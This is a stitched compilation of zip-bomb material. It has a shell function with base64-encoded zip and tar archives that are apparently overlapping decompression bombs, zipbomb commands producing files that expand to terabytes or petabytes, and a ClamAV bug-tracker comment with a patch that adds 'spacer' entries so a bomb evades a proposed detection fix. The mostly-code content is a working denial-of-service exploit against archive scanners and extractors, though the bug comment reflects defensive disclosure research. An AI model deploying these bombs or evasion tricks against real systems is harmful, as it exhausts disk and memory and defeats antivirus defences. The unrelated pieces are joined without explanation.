https://github.com/corkami/mitra


install_forensic_treat() { # efi_dir
    local zipbase64 tarbase64
    zipbase64="UEsDBBQAAAAIAAgDZDz59IlkSAEAALgBAAAHAAAAci9yLnppcAAlANr/UEsDBBQAAAAIAAgDZDz5
9IlkSAEAALgBAAAHAAAAci9yLnppcAAvAND/ACUA2v9QSwMEFAAAAAgACANkPPn0iWRIAQAAuAEA
AAcAAAByL3IuemlwAC8A0P/CVI5XOQAFAPr/wlSOVzkABQD6/wAFAPr/ABQA6//CVI5XOQAFAPr/
AAUA+v8AFADr/0KIIcQAABQA6/9CiCHEAAAUAOv/QoghxAAAFADr/0KIIcQAABQA6/9CiCHEAAAA
AP//AAAA//8ANADL/0KIIcQAAAAA//8AAAD//wA0AMv/QughXg8AAAD//wrwZmQSYcAV3OigSL9I
ryqzIMCblQ3EZwRCUwYGBkAABgD5/20BAAAAAELoIV4PAAAA//8K8GZkEmHAFdzooEi/SK8qsyDA
m5UNxGcEQlMGBgZAAAYA+f9tAQAAAABQSwECFAAUAAAACAAIA2Q8+fSJZEgBAAC4AQAABwAAAAAA
AAAAAAAAAAAAAAAAci9yLnppcFBLBQYAAAAAAQABADUAAABtAQAAAAA="

    tarbase64="H4sIAAAAAAAAACrSL9IrSSzSS69ioBkwAAIzExMgbQ7hI4mbGhuB2YYo6k0MzcwZFGDqRgHtgHw3
B5QFAAAA//8APADD/yrSL9IrSSzSS69ioBkwAAIzExMgbQ7hI4mbGhuB2YYo6k0MzcwZFGDqRgHt
gHw3B5QFAAAA//8APADD/0LoJV0vAAUA+v9C6CVdLwAFAPr/AAUA+v8AFADr/0LoJV0vAAUA+v8A
BQD6/wAUAOv/QoghxAAAFADr/0KIIcQAABQA6/9CiCHEAAAUAOv/QoghxAAAFADr/0KIIcQAAAAA
//8AAAD//wAnANj/QoghxAAAAAD//wAAAP//ACcA2P/CVIZVGQAAAP//AAgA9/8PYlI2AAgAAGIY
BaNgFIyCQQ0AAQAA///CVIZVGQAAAP//AAgA9/8PYlI2AAgAAGIYBaNgFIyCQQ0AAQAA//8PYlI2
AAgAAA=="

}

# zbsm.zip 42 kB → 5.5 GB
zipbomb --mode=quoted_overlap --num-files=250 --compressed-size=21179 > zbsm.zip
# zblg.zip 10 MB → 281 TB
zipbomb --mode=quoted_overlap --num-files=65534 --max-uncompressed-size=4292788525 > zblg.zip
# zbxl.zip 46 MB → 4.5 PB (Zip64, less compatible)
zipbomb --mode=quoted_overlap --num-files=190023 --compressed-size=22982788 --zip64 > zbxl.zip

Originally posted at https://bugzilla.clamav.net/show_bug.cgi?id=12356#c6

David Fifield 2019-08-05 18:32:34 EDT

(In reply to Micah Snyder from comment #4)
> I have a patch that records the size and offset of the previous file found
> in the zip when performing extraction using the central directory.  It
> compares these values with the current file to determine if the local file
> header data is overlapping.

I think the technique of comparing only successive central directory entries can be fooled, for instance by inserting "spacer" files in the central directory between the bomb files. For example, try this modification to the zipbomb source code:

@@ -664,6 +664,13 @@ def write_zip_quoted_overlap(f, num_files, compressed_size=None, max_uncompresse
         central_directory.append(CentralDirectoryHeader(offset, record.header))
         offset += f.write(record.header.serialize(zip64=zip64))
         offset += f.write(record.data)
+    spacers = []
+    for i in range(num_files - 1):
+        header = LocalFileHeader(0, 0, binascii.crc32(b""), b"spacer" + filename_for_index(i), compression_method=0)
+        spacers.append(CentralDirectoryHeader(offset, header))
+        offset += f.write(header.serialize(zip64=zip64))
+        offset += f.write(b"")
+    central_directory = [x for y in zip(central_directory, spacers) for x in y] + central_directory[len(spacers):]

     cd_offset = offset
     for cd_header in central_directory:

Generate a zip file using the command:

./zipbomb --mode=quoted_overlap --num-files=32767 --max-uncompressed-size=4292788525 > spaced.zip

It unzips to 141 TB, still pretty big.
